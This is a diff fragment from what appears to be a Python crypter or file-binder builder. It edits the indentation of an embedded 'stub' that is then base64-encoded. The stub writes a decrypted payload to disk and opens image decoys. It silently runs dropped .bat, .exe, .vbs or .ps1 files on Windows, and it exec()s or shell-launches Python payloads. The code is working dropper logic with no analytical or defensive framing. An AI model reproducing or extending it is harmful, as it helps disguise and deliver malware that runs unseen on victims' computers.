@@ -307,19 +307,19 @@ exec_extensions = ('bat', 'exe', 'vbs', 'ps1')
 python_extensions = ('py')
 nf = open(drpnm, 'wb')
 try:
-\tnf.write(dcy_data)
+	nf.write(dcy_data)
 except:
-\tpass
+	pass
 nf.close()
 if os.path.exists(drpnm):
-\tif drpnm.split('.')[1] in image_extensions:
-\t\timageViewerFromCommandLine = {'linux':'xdg-open', 'win32':'explorer', 'darwin':'open'}[sys.platform]
-\t\tsubprocess.run([imageViewerFromCommandLine, drpnm], close_fds=True)
-\tif drpnm.split('.')[1] in exec_extensions and sys.platform == 'win32':
-\t\tos.system(drpnm)
-\tif drpnm.split('.')[1] in python_extensions:
-\t\texec(dcy_data)
-\t\tproc = subprocess.Popen('python {fn}'.format(fn=drpnm), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	if drpnm.split('.')[1] in image_extensions:
+		imageViewerFromCommandLine = {'linux':'xdg-open', 'win32':'explorer', 'darwin':'open'}[sys.platform]
+		subprocess.run([imageViewerFromCommandLine, drpnm], close_fds=True)
+	if drpnm.split('.')[1] in exec_extensions and sys.platform == 'win32':
+		os.system(drpnm)
+	if drpnm.split('.')[1] in python_extensions:
+		exec(dcy_data)
+		proc = subprocess.Popen('python {fn}'.format(fn=drpnm), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 """
 
 		stub_base64 = base64.b64encode(stub.encode('utf-8'))
